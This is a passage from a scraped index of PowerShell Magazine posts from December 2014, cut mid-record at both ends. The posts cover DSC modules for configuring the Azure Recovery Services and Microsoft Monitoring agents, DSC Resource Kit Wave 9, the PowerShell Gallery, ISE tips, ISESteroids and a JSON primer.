Vault.   cMARSEncryptionPhrase is used to configure the encryption settings for the MARS Agent service.   At present, this resource module contains four DSC resources that are the fundamental building blocks for using MARS Agent.\n{#user-content-using-cmarsagentinstall-resource.anchor}Using cMARSAgentInstall resource The cMARSgentInstall is a composite DSC resource. This can be used to install MARS Agent in an unattended manner. Behind the scenes, this resource uses the Package DSC resource.\nThe SetupPath property is used to specify a local folder path where MARS Agent installer is stored. This can also be the HTTP location for downloading the installer. For example, the following function can be used to get the redirected URL from fwlink on Microsoft site\nFunction Get-TrueURL { Param ( [parameter(Mandatory)] $Url ) $req = [System.Net.WebRequest]::Create($url) $req.AllowAutoRedirect=$false $req.Method=\u0026quot;GET\u0026quot; $resp=$req.GetResponse() if ($resp.StatusCode -eq \u0026quot;Found\u0026quot;) { return $resp.GetResponseHeader(\u0026quot;Location\u0026quot;) } else { return $resp.responseURI } } The fwlink to download MARS Agent installer is https://go.microsoft.com/fwLink/?LinkID=288905\u0026amp;clcid=0x409.\n$TrueUrl = Get-TrueUrl -Url 'https://go.microsoft.com/fwLink/?LinkID=288905\u0026clcid=0x409'  Now, this redirected URL can be given as value to the Path property. The Package resource downloads the installer before it attempts to install it on the target system.\nHere is a configuration script that uses the cMARSAgentInstall composite resource.\ncMARSAgentInstall AgentSetup { SetupPath = 'C:\\AzureBackup\\MARSAgentInstaller.exe' EnableWindowsUpdate = $true Ensure = 'Present' }  The EnableWindowsUpdate property, when specified, uses Windows Update after the install to check if there are any updates to the agent software. This property is not mandatory.\nOnce you have installed the MARS Agent, you can register the target system with the Backup Vault. But, before that, if your target system is behind a proxy server, you need to specify the proxy server and proxy port. This can be done using the cMARSProxy DSC resource.\n{#user-content-using-cmarsproxy-resource.anchor}Using cMARSProxy resource The cMARSProxy resource can be used to add or remove proxy settings for the Microsoft Azure Recovery Services Agent.\nThe only property that is mandatory is the ProxyServer. For this, you need to specify a proxy URL (either HTTP or HTTPS). The following configuration script demonstrates this usage.\ncMARSProxy MARSProxy { ProxyServer = 'https://myProxy' Ensure = 'Present' }  DO NOT add the proxy port as a part of the URL. Instead, use the ProxyPort property.\ncMARSProxy MARSProxy { ProxyServer = 'https://myProxy' ProxyPort = 1010 Ensure = 'Present' }  Optionally, if your proxy server requires authentication, you can specify that using the ProxyCredential property. This is a_PSCredential_ type property and therefore you need to use certificates to encrypt the credentials within the configuration. In case you don’t have the certificates for your development or test environment, you can pass the plain text credentials.\n$ProxyCredential = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'MARSDemo' } ) } Configuration MARSAgentConfiguration { Import-DscResource -ModuleName cMicrosoftAzureRecoveryServices Node $AllNodes.NodeName { cMARSProxy MARSProxy { ProxyServer = 'https://myProxy' ProxyPort = 1010 ProxyCredential = $ProxyCredential Ensure = 'Present' } } } Once you set the proxy credentials, if you need to change the password alone within the credentials, you can use the_Force_ property to force that change.\n$ProxyCredential = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'MARSDemo' } ) } Configuration MARSAgentConfiguration { Import-DscResource -ModuleName cMicrosoftAzureRecoveryServices Node $AllNodes.NodeName { cMARSProxy MARSProxy { ProxyServer = 'https://myProxy' ProxyPort = 1010 ProxyCredential = $ProxyCredential Ensure = 'Present' Force = $true } } } Using cMARSRegistration resource The cMARSRegistration resource can be used to register the target system with Azure Backup Vault. For registering with the Backup Vault, we need the Vault credentials. These credentials can be downloaded from the Azure Portal by navigating to the Backup Vault.\nOnce these Vault credentials are downloaded and stored in a local folder, we can use the cMARSRegistration resource configuration to register the server. The VaultCredential property can be used to specify the absolute path to the Vault credentials file.\ncMARSRegistration AgentRegistration { VaultCredential = 'C:\\AzureBackup\\DSCResourceDemo.VaultCredentials' Ensure = 'Present' }  Make a note that the path specified must be absolute path. When the registration is complete, you can see the server listed in the Backup Vault dashboard.\nOnce the target system registration is complete, you can set the encryption pass phrase to encrypt the backup that is going to the Backup Vault. This is done using cMARSEncryptionPhrase DSC resource.\nNote that there is no method to de-register a target system. There is no API available for that. Therefore, when you sent_Ensure=’Absent’_, you just see a message that the Absent functionality is not implemented.\nYou can uninstall the recovery services agent when you don’t need to backup the system anymore. However, remember that uninstalling the agent does not remove the system registration from the Backup Vault. You need to manually remove the server by navigating to the Backup Vault on the Azure management portal.\n{#user-content-using-cmarsencryptionphrase-resource.anchor}Using cMARSEncryptionPhrase resource The cMARSEncryptionPhrase resource enables you to configure the encryption settings for the MARS Agent Service. This encryption phrase will be used as the encryption key to encrypt the contents of your server backup.\nThe EncryptionPassPhrase is the only mandatory property and takes plain text string as the passphrase. The resource module internally converts the plain text string to secure string type required for the agent service configuration.\nA secure string cannot be directly implemented as the MOF schema does not support a SecureString type. This can be collected as a credential but it does not make a lot of sense. So, I left it as the plain text string for now. This may change in a future release.\ncMARSEncryptionPhrase Passphrase { EncryptionPassPhrase = 'fawr123456789012345' Ensure = 'Present' }  Note that the length of the passphrase must be at least 16 characters.\nOnce the passphrase is set, if you need to modify the passphrase, you can use the Force property.\ncMARSEncryptionPhrase Passphrase { EncryptionPassPhrase = 'fawr12345asf2012345' Force = $true Ensure = 'Present' }  Note that there is no way in the API (AFAIK) to remove the passphrase or encryption settings. Therefore, specifying Ensure=’Absent’ has no effect on the agent’s encryption settings.\nThis is it. I will soon add the functionality to schedule backups to Azure using a DSC resource. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/22/holiday-present-from-powershell-magazine-dsc-resource-module-to-install-and-configure-azure-recovery-services-agent/","tags":["PowerShell DSC"],"title":"Holiday present from PowerShell Magazine – DSC resource module to install and configure Azure Recovery Services Agent"},{"categories":["PowerShell DSC","News"],"contents":"Windows PowerShell team just released a new wave of DSC resources taking the overall DSC resource count to 172! This is a great accomplishment within a single year! Great job.\nThis wave contains updates to various existing resources and 5 new DSC resource modules.\n   Name New, or Updated What was added?     xAzure Updated Added a new resource, xAzureVMDscExtension, which provides the ability to use the DSC Extension for Azure VM’s to apply configurations to new or existing VM’s.Also addressed issues reported in xAzureStorageAccount   xAzurePack New xAzurePack adds 8 new resources used for installation and configuration of Windows Azure Pack. The resources are xAzurePackSetup, xAzurePackUpdate, AzurePackAdmin, xAzurePackFQDN, xAzurePackDatabaseSetting, xAzurePackIdentityProvider, xAzurePackRelyingParty, xAzurePackResourceProvider   xExchange Updated Added 5 new resources: xExchInstall, xExchJetstress, xExchJetstressCleanup, xExchUMCallRouterSettings, xExchWaitForADPrep. Additional improvements were made in xExchActiveSyncVirtualDirectory, xExchAutoMountPoint, xExchExchangeCertificate, xExchMailboxDatabase, ExchOutlookAnywhere, xExchUMService, and the related samples.   xInternetExplorer New Allows DSC to configure IE home page(s)   xPsExecutionPolicy New Enables configuring the PS Execution Policy via DSC   xScom Updated Adds new 5 resources: xSCOMManagementServerUpdate, SCOMWebConsoleServerUpdate, and xSCOMConsoleUpdate for updating OM to Update Rollup 4, plus xSCOMAdmin for adding OM admins, and xSCOMManagementPack for installing OM Management Packs.   xSCSPF Updated Adds xSCSPFServerUpdate for updating and SPF server to Update Rollup 4.   xScSr Updated Adds the xSCSRServerUpdate resource for updating an SR server to Update Rollup 4   xScVMM Updated Adds 3 new resources: xSCVMManagementServerUpdate, and xSCVMMConsoleUpdate for updating to Update Rollup 4, and xSCVMMAdmin for adding VMM admins   xSqlServer Updated Adds 5 new DSC resources for SQL failover clusters, and reporting services config. Also fixes an issue with SQL setup when using SQL mixed mode security.   xTimeZone New Set the Time Zone using DSC with this resource   xWindowsRestore new Two new resources allow you to use DSC to configure system restore, create or remove a restore point    The xAzurePack is a great addition and I will be using it right away! 🙂\nYou can download the new resource kit using PowerShell, whatelse!?\nInvoke-WebRequest -Uri 'https://gallery.technet.microsoft.com/DSC-Resource-Kit-All-c449312d/file/131371/1/DSC%20Resource%20Kit%20Wave%209%2012172014.zip' -OutFile \"${env:TEMP}\\DSC-Wave9.zip\"  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/18/holiday-gift-from-windows-powershell-team-dsc-resource-kit-wave-9/","tags":["News","PowerShell DSC"],"title":"Holiday gift from Windows PowerShell team – DSC Resource Kit Wave 9"},{"categories":["PowerShell DSC"],"contents":"Note: This article applies to Windows Management Framework (WMF) 5.0 Preview release only.\nWindows PowerShell team made a formal announcement of PowerShell Gallery availability (limited preview) last month. The PowerShell Gallery is the place where people can publish their PowerShell modules and DSC resources. People who are interested in using those modules or DSC resources can explore and install them from the PowerShell Gallery directly. This is made possible using a module called PowerShellGet in Windows Management Framework (WMF) 5.0 Preview release.\nI published my DSC resource modules to the PowerShell Gallery. So, in this article, I will show you how to find the DSC resources in these modules and install them.\nThere are two different ways you can explore PowerShell Gallery for DSC resources.\nUsing Find-Module The Find-Module cmdlet is a part of the PowerShellGet module in WMF 5.0 Preview release. Using this cmdlet, we can find PowerShell modules and DSC resources published in the PowerShell Gallery.\nFind-Module -Includes DscResource -Verbose  The possible valid arguments for the -Includes parameter include DscResource, Cmdlet, and Function. By specifying DscResource, we specify the intent that we are interested in modules that include DSC resources.\nAs you see in the above output, we see five modules containing DSC resource. It includes the three resource modules I had published. The other way of using the Find-Module cmdlet is to use tags.\nAt the time of this writing, note that there are only five resource modules listed here whereas there are more than 50 DSC resource modules in the PowerShell Gallery. This is a known issue.\nFind-Module -Tag DSC  This will list all modules that carry a “DSC” tag that was added while publishing the module. This is not a fool-proof method. If the author did not add this tag during publish phase, it won’t appear in this list even when the module contains DSC resources.\nUsing Find-DscResource The PSDesiredStateConfiguration module in Windows PowerShell 5.0 Preview has a new cmdlet called Find-DscResource. Don’t confuse this with Get-DscResource. The Get-DscResource gets all DSC resources available on the local system whereas Find-DscResource gets you DSC resources from the PowerShell Gallery or any other repository specified using the -Repository parameter.\nWe can filter this down to a specific module by using the -ModuleName parameter.\nAlso, if you need only a specific resource, you can get that using the -Name parameter.\nAt the time of writing, -Name parameter does not support wildcards.\nYou can use -Tag property to search for specific tags used while publishing the resource module.\nInstalling DSC resource modules The Install-Module cmdlet can be used to install DSC resource modules from the gallery.\nWhen you use the Install-Module cmdlet with just the -Name parameter, the default install location for the module will be ‘C:\\Program Files\\WindowsPowerShell\\Modules‘. So, this requires administrative privileges. However, if you want to install the module in the current user context without administrator privileges, you can do so using the -Scope parameter by setting it to CurrentUser.\nOnce you understand how to use these cmdlets, you can point them towards a local repository too.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/15/exploring-and-installing-dsc-resources-published-in-powershell-gallery/","tags":["PowerShell DSC"],"title":"Exploring and installing DSC resources published in PowerShell Gallery"},{"categories":["PowerShell DSC","Azure"],"contents":"A couple of weeks ago, I had announced a custom DSC resource module to install and configure Microsoft Monitoring Agent that is required to configure Azure Operational Insights. It was released with only Operational Insights enablement. Today I pushed a new version of this module to include management group configuration for connecting to on-premises Operations Manager deployment and Active Directory integration. With these two new resources, the cMMAgent DSC resource module is complete and contains six resources.\nMicrosoft Monitoring Agent (cMMAgent) DSC resource module contains the following resources.\n cMMAgentInstall is used to install Microsoft Monitoring Agent.   cMMAgentProxyName is used to add or remove the proxy URL for the Microsoft Monitoring Agent configuration.   cMMAgentProxyCredential is used to add, modify, or remove the credentials that need to be used to authenticate to a proxy configured using cMMAgentProxyName resource.   cMMAgentOpInsights is used to enable or disable Azure Operational Insights within the Microsoft Monitoring Agent. This can also be used to update the WorkspaceID and WorkspaceKey for connecting to Azure Operational Insights.   cMMAgentAD is used to enable or disable Active Directory integration for the Microsoft Management Agent. By enabling AD integration, you can assign agent-managed computers to management groups.   cMMAgentManagementGroups DSC resource can be used to add or remove management groups. You can use this resource to update the action account credentials for the management agent service.   Along with the two new DSC resources there are a couple of breaking changes. I renamed UpdateWorkspace property in cMMAgentOpInsights resource and UpdateCredential property of cMMAgentProxyCredential resource to Force. This decision was taken to ensure that the resource design is inline with the recommended DSC best practices and patterns.\nYou can take a look at the readme on Github for a complete overview of each resource in the cMMAgent DSC module. Here is an explanation of the two new resources I added today.\nUsing cMMAgentAD resource The cMMAgentAD resource can be used to enable or disable Active Directory (AD) integration. With AD Directory Services integration, the agent-managed computers can be automatically assigned to the Operations Manager management groups.\nThere is only one property that is EnableAD. This is a Boolean property. Setting this to True enables AD integration and disables otherwise.\ncMMAgentAD MMAgentAD { EnableAD = $true }  {#user-content-using-cmmagentmanagementgroups-resource.anchor}Using cMMAgentManagementGroups resource The cMMAgentManagementGroups resource enables you to add or remove Operations Manager management groups from the Microsoft Monitoring Agent configuration. Additionally, you can configure action account credentials for the agent service.\nThe ManagementGroupName and ManagementServerName properties are mandatory. The ManagementServerPort is optional and set to 5723, by default. This property need not be changed unless your Operations Manager implementation is customized.\ncMMAgentManagementGroups MMAgentManagementGrup { ManagementGroupName = 'SCMgmtGroup' ManagementServerName = 'SCOM-1' Ensure = 'Present' }  You can specify the action account credentials for the management agent service. This needs to be a PSCredential object. So, as per the DSC best practices, you must encrypt these credentials using certificates.\ncMMAgentManagementGroups MMAgentManagementGrup { ManagementGroupName = 'SCMgmtGroup' ManagementServerName = 'SCOM-1' ActionAccountCredential = $Credential Ensure = 'Present' }  If you do not have certificate implementation in your test or development infrastructure, you can use DSC configuration data to allow plain text credentials.\n$ActionAccountCredential = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'WMF5-1' } ) } Configuration MMAgentConfiguration { Import-DscResource -ModuleName cMMAgent Node $AllNodes.NodeName { cMMAgentManagementGroups MMAgentManagementGrup { ManagementGroupName = 'SCMgmtGroup' ManagementServerName = 'SCOM-1' ActionAccountCredential = $ActionAccountCredential Ensure = 'Present' } } } Once you add a management group, if you need to update the action account credentials, you can use the Force property. When you set Force property to True, the action account credentials get updated. The value of Ensure property has no meaning when using the Force property. Also, when using Force, the actionAccountCredential property must be set.\n$updatedActionAccountCredential = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'WMF5-1' } ) } Configuration MMAgentConfiguration { Import-DscResource -ModuleName cMMAgent Node $AllNodes.NodeName { cMMAgentManagementGroups MMAgentManagementGrup { managementGroupName = 'SCMgmtGroup' managementServerName = 'SCOM-1' actionAccountCredential = $updatedActionAccountCredential Force = $true } } } This is it. So, what is next? I will publish the DSC resource modules that I am developing to PowerShell Gallery so that you can use PowerShellGet module to download them to target systems. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/12/microsoft-monitoring-agent-dsc-resource-updated-to-enable-ad-and-management-groups-configuration/","tags":["Azure","PowerShell DSC"],"title":"Microsoft Monitoring Agent DSC resource updated to enable AD and management groups configuration"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 5.0 or later.\nIf you have ever wondered how you can edit files on a remote system using Windows PowerShell, it is now possible with PowerShell 5.0 preview. This is, at the moment, possible only within PowerShell ISE.\nEnter-PSSession -ComputerName computername psEdit filename  If you are wondering, what is psEdit, it existed in Windows PowerShell for a long time (since 2.0) and is used to add the specified file(s) to the current PowerShell tab in PowerShell ISE.\nHere is a quick demo of remote file editing in PowerShell 5.0.\nPowerShell console has ise command that opens PowerShell ISE. However, it is not possible to perform remote file editing from PowerShell console prompt. The ise command is mapped to PowerShell_ise.exe and therefore it just creates a process on the remote session.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/08/pstip-editing-remote-file-in-powershell-ise/","tags":["Tips and Tricks"],"title":"#PSTip Editing remote file in PowerShell ISE"},{"categories":["ISESteroids","News","Module Spotlight"],"contents":"ISESteroids originally started as a simple add-on to add professional editor capabilities to the built-in PowerShell ISE editor. Meanwhile, it evolved to a slick high-end PowerShell script editor. PowerShell Magazine has covered the basic highlights and the new script risk mitigation capabilities previously. Today, we’d like to walk you through three of the brand new features introduced in ISESteroids 2.0 Release Candidate: Themable UI, advanced script debugging, and script profiling.\nFully Themable ISE The sensual side is important, even with scripting. That’s why ISESteroids lets you customize almost any aspect of the UI to make yourself at home. To select a different theme, click the skin toolbar button (it shows three color circles) which opens the “Themes” menu. Click “Themes” and choose from the predefined themes.\nThemes can change the look and feel completely, including colors, fonts, and even the shape of tab buttons.\nTo adjust a theme, or create your very own, enable “Enable Theme Adjustment” in the Themes menu. Then, right-click any UI element that you want to redesign.\nWhen you right-click a language token, the Theme menu lets you quickly change token colors as well. You can even right-click the console pane, change console colors, enable an “Admin Warning” indicator, and choose a different font and size for the console.\nThe best way of exploring all capabilities is to right-click just about everything inside the ISE. Most areas now have context menus. When you right-click the status bar, for example, you can enable “Switch Color When Busy”: the status bar will then turn orange while PowerShell executes code. Or, right-click the main menubar, and enable “Capitalize Menu Headers” or “AutoHide Toolbars”.\nDebugger Margin One of the most important new features is the debugger margin. Right-click the line number margin, and choose “Show Debugger Margin”. The debugger margin is a multi-purpose tool. It uses different colors for saved and unsaved scripts, and you can click it to set and clear breakpoints.\nIn addition, a right-click opens the debug menu which allows you to set advanced breakpoints. Simply choose “Breakpoints/Add Variable Breakpoint”. This opens a dialog, and you can choose which variable to monitor. Optionally, you can expand the “Advanced Condition” Setting, and enter a PowerShell condition that must be met for the breakpoint to break.\nTo start debugging, run the script. The debugger margin changes color, and when a breakpoint is hit, a red ellipse indicates a line breakpoint, whereas a blue ellipse marks a dynamic breakpoint. Clicking the ellipse clears the breakpoint.\nScript Profiling In addition to the debugging capabilities, ISESteroids can also profile scripts, identifying bottle necks.\nTo enable profiling, right-click the debugger margin, and choose “Profiling/Profile Current Script” or “Profiling/Profile All Scripts”. Then, run the script.\nThe debugger margin will now show a real-time graph indicating how much time each script line took to execute. In the menu “Profiling”, you can also change what the graph shows and how it scales. By default, the profiler monitors performance. You can switch it to “Frequency”, too. Now, the graph shows how often each line of a script gets executed.\nISESteroids 2 RC comes with plenty of additional features and is available Dec 6, 2014 at www.powertheshell.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/05/isesteroids-rc/","tags":["ISESteroids","News","Modules"],"title":"ISESteroids RC"},{"categories":["How To","JSON"],"contents":"JavaScript Object Notation ([JSON][1]) is quickly becoming the most used data-interchange format. XML enjoyed the top spot for a long time but slowly people have been moving towards JSON. JSON is a first-class citizen in Windows PowerShell. With many automation frameworks and software products adopting JSON, it is important for system administrators to understand what is JSON and how to use it. This article is a JSON primer to give you an overview of this data-interchange format and how to use it.\nJSON facilitates structured data-interchange between programming languages. [ECMA-404 specification][2] describes the JSON data-interchange format. Although JSON carries JavaScript in its name, you don’t need to know [JavaScripting][3] to be able to learn and use JSON. Its name comes from the fact that the JSON format is derived from the JavaScript object literal syntax.\nvar car = { type: \"Fiat\", model: 500, color: \"white\" };  As you see in the above example, the JavaScript object literal is nothing but a key-value pair. The JSON data-interchange format is similar to this with a few differences. Let’s explore!\nIntroducing JSON data-interchange format If you have worked with different programming or scripting languages, each of them have their own data representation. In this era of cloud and mobile services, the services built using one programming language are generally consumed by a myriad of clients built in various languages. Take an example of services offered by Microsoft Azure. Most or all of them are written in C# and offer APIs with JSON as the output data format. We can consume these services in PowerShell, Python, and many more languages with libraries to translate the JSON data into a native data representation within those languages. This is how we have been using XML for a long time. So, this should be straightforward to understand. Then, why JSON? This topic is highly debatable. However, I like to quote just one example. You can read [rest here][4].\nXML is quite verbose. Just think about representing the above JavaScript object literal in XML.\n\u0026lt;Car\u0026gt; \u0026lt;Type\u0026gt;Fiat\u0026lt;/Type\u0026gt; \u0026lt;Model\u0026gt;500\u0026lt;/Model\u0026gt; \u0026lt;Color\u0026gt;White\u0026lt;/Color\u0026gt; \u0026lt;/Car\u0026gt;  Now, let us see the same representation in JSON. Don’t worry about the details of the JSON representation but just see how clean it is compared to XML.\n{ \"Car\" : { \"Type\" : \"Fiat\" \"Model\" : 500 \"Color\" : \"White\" } }  What we have seen above is a very simple example. Imagine the verbosity of XML when the data that needs to be represented is huge. This is certainly one of the reasons for me to choose between XML and JSON. With this background, let us go into the details of JSON data format.\nTo start with, the general syntax for writing JSON objects is as follows:\n{ \"Data1\" : \"Value1\", \"Data2\" : \"Value2\" }  As you see in this example, the key-value pair is enclosed within curly brackets. The keys, Data1 and Data2 as shown in the example, must always be enclosed within double quotes. This is one key difference from the JavaScript object literal syntax. The key and value are separated by a colon “:”. Also, observe that the key-value pairs (or members) must be separated by commas.\nYou can nest objects in JSON. Here is a generic example.\n{ \"Data1\" : \"Value1\", \"Data2\" : { \"Data21\" : \"Value21\" } }  Whether we need to enclose the value within double quotes or not depends on the type of the data.\nData Types in JSON A JSON value can be of a basic data type such as string, number, and boolean. You can create ordered list of values such as arrays. And, as shown above, you can use unordered key-value pairs within JSON. JSON also supports empty values denoted by null.\nHere are some examples of data types and how they are used in JSON.\nNumbers In JSON data format, numbers represent a sequence of digits. There is no differentiation between floats, doubles, and so on. JSON values cannot be hexadecimal or octal. Here is an example of representing numbers in JSON.\n{ \"age\" : 30, \"speed\" : 10.12, \"somenumber\" : 1.778979793e+23, \"negativenumber\" : -1212 }  As you see in the above example, we can represent different types of numbers including exponential and negative numbers. When the value you want to store in JSON format is a number, do not enclose it within the quotes.\nStrings Like every other programming or scripting language, a string represents a sequence of characters.\n{ \"Name\" : \"Windows PowerShell\", \"Tab\" : \"Windows\\tPowerShell\", \"NewLine\" : \"Windows\\nPowerShell\", \"Backspace\" : \"Windows\\bPowerShell\", \"CarriageReturn\" : \"Windows\\rPowerShell\", \"WithQuotes\" : \"Windows \\\"PowerShell\\\"\", \"HexCharacters\" : \"Windows PowerShell \\u1F44D\" }  I have included several ways of representing string values in the above example. You see that all the values are enclosed within double quotes. Using single quotes is not allowed in JSON. When you need to use double quotes within the value string, you need to escape the same using the escape sequences. There are other escape sequences also shown in the above example. If you need to include special Unicode characters derived from hex representation, the same can be done using \\u escape sequence.\nBooleans Boolean values can be represented in JSON using true or false.\n{ \"Test1\" : true, \"Test2\" : false }  Remember that the values representing Boolean values should be always in lower case. Using True and False is not valid.\nNull You can also create empty values by assigning null to a key.\n{ \"Name\" : null }  Make a note that the value you assign must be null in lowercase. Using Null (uppercase) results in an error.\nArrays Arrays are an ordered list of values. Within the JSON data format, these values are enclosed within square brackets ([ and ]).\n{ \"Array1\" : [\"PowerShell\", \"Python\", \"Perl\"], \"Array2\" : [10, 11, 12], \"Array3\" : [\"Ravi\",10,true] }  As you see in the example, you can assign the ordered lists or arrays to JSON keys. It is possible to mix data types (see Array3) within the arrays. However, this is not recommended as not all programming languages support mixed data types in arrays. So, when the JSON data is passed on to another language, there may be errors. Avoid mixing data types within in arrays in JSON.\nObjects Finally, objects within JSON data are the unordered set of key-value pairs. Essentially, by using objects within JSON data, you create nested JSON data representation.\n{ \"Name\" : \"Windows PowerShell\", \"Version\" : \"4.0.30319.18444\", \"IsStable\" : true, \"PreviousVersions\" : [1.0,2.0,3.0], \"Future\" : { \"Version\" : 5.0, \"IsReady\" : false } }  The above example is a comprehensive one. It shows all data types along with nested objects. This ends our discussion on the data types in JSON. Now, how do you validate whether your JSON format is valid or not? I simply use the ConvertFrom-Json cmdlet.\n$json = @' { \"Name\" : \"Windows PowerShell\", \"Version\" : \"4.0.30319.18444\", \"IsStable\" : true, \"PreviousVersions\" : [1.0,2.0,3.0], \"Future\" : { \"Version\" : 5.0, \"IsReady\" : false } } '@ $Object = ConvertFrom-Json -InputObject $json ![](/images/json1.png) This is just a primer like I mentioned earlier. I suggest that you start looking at using JSON wherever possible. It will be an essential skill to have. I will show you why in my future posts here! 🙂 [1]: http://json.org/ [2]: http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-404.pdf [3]: http://en.wikipedia.org/wiki/JavaScript [4]: https://www.google.co.in/webhp?sourceid=chrome-instant\u0026ion=1\u0026espv=2\u0026ie=UTF-8#sourceid=chrome-psyapi2\u0026ie=UTF-8\u0026q=JSON%20vs%20XML","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/12/01/a-json-primer-for-administrators/","tags":["How To","JSON"],"title":"A JSON primer for administrators"},{"categories":["Azure","PowerShell DSC"],"contents":"Microsoft Monitoring Agent (MMA) is used to connect target systems to System Center Operations Manager or directly to Azure Operational Insights. This DSC resource module intends to build custom resources for installing and configuring MMA on target systems.\nAt present, there are four resources available within this module.\n cMMAgentInstall is used to install Microsoft Monitoring Agent.   cMMAgentProxyName is used to add or remove the proxy URL for the Microsoft Monitoring Agent configuration.   cMMAgentProxyCredential is used to add, modify, or remove the credentials that need to be used to authenticate to a proxy configured using cMMAgentProxyName resource.   cMMAgentOpInsights is used to enable or disable Azure Operational Insights within the Microsoft Monitoring Agent. This can also be used to update the WorkspaceID and WorkspaceKey for connecting to Azure Operational Insights.   This module is still work in-progress. I will add AD integration and management group configuration very soon.\nI could have combined the resources into just a couple of them but that increases the complexity of the resource module. Therefore, I decided to go much granular and divide these into multiple resources. For example, thecMMAgentProxyCredential resource lets you not just add or remove credentials but also update the credentials, if required.\n{#user-content-using-cmmagentinstall-resource.anchor}Using cMMAgentInstall resource The cMMAgentInstall is a composite DSC resource. This can be used to install MMAgent in an unattended manner. Behind the scenes, this resource uses the Package DSC resource.\nThe Path property is used to specify a local folder path where MMAgent installer is stored. This can also be the HTTP location for downloading an installer. For example, the following function can be used to get the redirected URL from fwlink on Microsoft site.\nFunction Get-TrueURL { Param ( [parameter(Mandatory)] $Url ) $req = [System.Net.WebRequest]::Create($url) $req.AllowAutoRedirect=$false $req.Method=\u0026quot;GET\u0026quot; $resp=$req.GetResponse() if ($resp.StatusCode -eq \u0026quot;Found\u0026quot;) { return $resp.GetResponseHeader(\u0026quot;Location\u0026quot;) } else { return $resp.responseURI } } The fwlink to download MMAgent installer is http://go.microsoft.com/fwlink/?LinkID=517476.\n$TrueUrl = Get-TrueUrl -Url 'http://go.microsoft.com/fwlink/?LinkID=517476'  Now, this redirected URL can be given as value can be given as the value of Path property. The Package resource downloads the installer before it attempts to install it on the target system.\nThe WorkspaceID and the WorkspaceKey can be retrieved from the Azure Operational Insights preview portal by navigating to Servers \u0026amp; Usage -\u0026gt; Configure.\nHere is a configuration script that uses the cMMAgentInstall composite resource.\nConfiguration MMASetup { Import-DscResource -Module cMMAgent -Name cMMAgentInstall cMMAgentInstall MMASetup { Path = 'C:\\OpInsights\\MMASetup-AMD64.exe' Ensure = 'Present' WorkspaceID = 'your-Workspace-Id' WorkspaceKey = 'Your-Workspace-Key' } } MMASetup Using cMMAgentProxyName resource The cMMAgentProxyName resource can be used to add or remove the proxy URL to the Microsoft Monitoring Agent configuration.\nThe only property here is the ProxyName property. For this, you need to specify a proxy URL (either HTTP or HTTPS) with any port number as required. The following configuration script demonstrates this usage.\ncMMAgentProxyName MMAgentProxy { ProxyName = 'https://moxy.in.com:3128' Ensure = 'Present' } Using cMMAgentProxyCredential resource The cMMAgentProxyName resource only lets you configure the proxy URL that needs to be used to connect to the Azure Operational Insights service. However, if the proxy requires authentication, you can use the cMMAgentProxyCredentialresource configure the same.\nWhen I was writing this resource module, there was a challenge in having only a PSCredential type property as the Key property. The schema MOF was failing validation and therefore forced me to separate it into ProxyUserName and_ProxyUserPassword_ properties. The _ProxyUserPassword_ is of type PSCredential and you can use the _Get-Credential_cmdlet to supply that. The user name you supply as a part of the PSCredential will not be used. Instead, the value supplied as an argument for the _ProxyUserName_ property will be used.\nNote that DSC best practices recommend that you encrypt the credentials used in a configuration script. So, ideally, you should use certificates to encrypt and decrypt the credentials. For test and development purposes, however, you can use the plain text passwords and this can be achieved by using DSC configuration data. The following example demonstrates this.\n$ProxyUserPassword = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'WMF5-1' } ) } Configuration MMAgentConfiguration { Import-DscResource -ModuleName cMMAgent Node $AllNodes.NodeName { cMMAgentProxyCredential MMAgentProxyCred { ProxyUserName = 'ravikanth' ProxyUserPassword = $ProxyUserPassword Ensure = 'Present' } } } Once you set the proxy credentials, if you need to change the password alone within the credentials, you can use the_UpdateCredential_ property to force that change. When using _UpdateCredential_ property, setting Ensure=Absent is not valid.\n$NewProxyUserPassword = Get-Credential $ConfigData = @{ AllNodes = @( @{ NodeName = '*'; PsDscAllowPlainTextPassword = $true }, @{ NodeName = 'WMF5-1' } ) } Configuration MMAgentConfiguration { Import-DscResource -ModuleName cMMAgent Node $AllNodes.NodeName { cMMAgentProxyCredential MMAgentProxyCred { ProxyUserName = 'ravikanth' ProxyUserPassword = $NewProxyUserPassword UpdateCredential = $True Ensure = 'Present' } } } Using cMMAgentOpInsights resource The cMMAgentInstall resource, by default, enables the Microsoft Monitoring Agent for Azure Operational Insights. This resource also configures the WorkspaceID and the WorkspaceKey required to connect to the Operational Insights service.\nThe cMMAgentOpInsights resource can be used to update the WorkspaceID and WorkspaceKey, if required and also to disable Azure Operational Insights within the Microsoft Monitoring Agent.\nBy setting both the WorkspaceID and the WorkspaceKey properties and Ensure to Present, you can enable Azure Operational Insights and update the WorkspaceID and WorkspaceKey.\ncMMAgentOpInsights MMAgentOpInsights { WorkspaceID = 'your-Workspace-ID' WorkspaceKey = 'your-Workspace-Key' Ensure = 'Absent' }  By setting Ensure to Absent along with required properties, Azure Operational Insights can be disable for the Microsoft Monitoring Agent.\ncMMAgentOpInsights MMAgentOpInsights { WorkspaceID = 'your-Workspace-ID' WorkspaceKey = 'your-Workspace-Key' Ensure = 'Absent' }  If you need to update only the WorkspaceKey, you can do that using the UpdateWorkspace 